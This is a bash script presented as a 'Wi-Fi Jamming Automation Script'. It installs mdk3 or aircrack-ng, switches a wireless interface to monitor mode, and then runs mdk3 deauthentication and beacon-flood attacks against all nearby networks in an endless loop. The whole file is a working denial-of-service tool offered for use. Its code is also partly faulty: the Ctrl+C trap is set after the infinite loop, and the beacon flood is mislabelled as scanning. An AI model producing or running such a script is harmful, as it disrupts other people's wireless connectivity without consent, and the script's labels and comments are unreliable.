#!/bin/bash

# Function to check and install mdk3 if it's missing
install_mdk3() {
    if ! command -v mdk3 &> /dev/null; then
        echo "[*] mdk3 not found, installing..."
        sudo apt update
        sudo apt install mdk3 -y
    else
        echo "[*] mdk3 is already installed."
    fi
}

# Function to check and install aircrack-ng (for airmon-ng) if it's missing
install_airmon_ng() {
    if ! command -v airmon-ng &> /dev/null; then
        echo "[*] airmon-ng not found, installing..."
        sudo apt update
        sudo apt install aircrack-ng -y
    else
        echo "[*] airmon-ng is already installed."
    fi
}

# Function to put the interface in monitor mode using airmon-ng
start_airmon_ng() {
    echo "[*] Starting airmon-ng..."
    sudo airmon-ng start $1
    sleep 2
    INTERFACE="$1mon"
    echo "[*] Interface set to $INTERFACE in monitor mode."
}

# Function to stop airmon-ng and return to normal mode
stop_airmon_ng() {
    echo "[*] Stopping airmon-ng and returning to normal mode..."
    sudo airmon-ng stop $INTERFACE
    sudo ip link set $INTERFACE down
    sudo ip link set $INTERFACE up
    echo "[*] Interface $INTERFACE is back to normal mode."
}

# Function to start mdk3 deauth attack
start_mdk3() {
    echo "[*] Starting mdk3 deauth attack..."
    sudo mdk3 $1mon d
}

# Function to scan Wi-Fi networks using mdk3, and then jam them
scan_and_jam() {
    while true; do
        # Start scanning for networks
        echo "[*] Scanning for Wi-Fi networks..."
        sudo mdk3 $1mon b
        sleep 10
        
        # Jamming networks found
        echo "[*] Jamming networks every 1 millisecond..."
        for wifi in $(iw dev $1mon scan | grep SSID | awk '{print $2}'); do
            sudo mdk3 $1mon d
            sleep 0.001
        done
        
        # Wait for 1 minute before repeating the scan and attack
        sleep 60
    done
}

# Script main menu
echo "====================================="
echo "   Wi-Fi Jamming Automation Script"
echo "====================================="
echo "[1] Use mdk3 for jamming"
echo "[2] Use airmon-ng for monitor mode"
echo "[3] Exit"
echo "====================================="
read -p "Choose an option: " option

case $option in
    1)
        # Install mdk3 if not installed
        install_mdk3
        read -p "Enter the wireless interface (e.g., wlan0): " interface
        sudo ip link set $interface up
        start_mdk3 $interface
        scan_and_jam $interface
        ;;
    2)
        # Install aircrack-ng if not installed
        install_airmon_ng
        read -p "Enter the wireless interface (e.g., wlan0): " interface
        start_airmon_ng $interface
        scan_and_jam $interface
        ;;
    3)
        echo "Exiting script."
        exit 0
        ;;
    *)
        echo "Invalid option. Exiting."
        exit 1
        ;;
esac

# Handling the Ctrl+C exit scenario
trap "echo 'Exiting script...'; stop_airmon_ng; exit 0" SIGINT
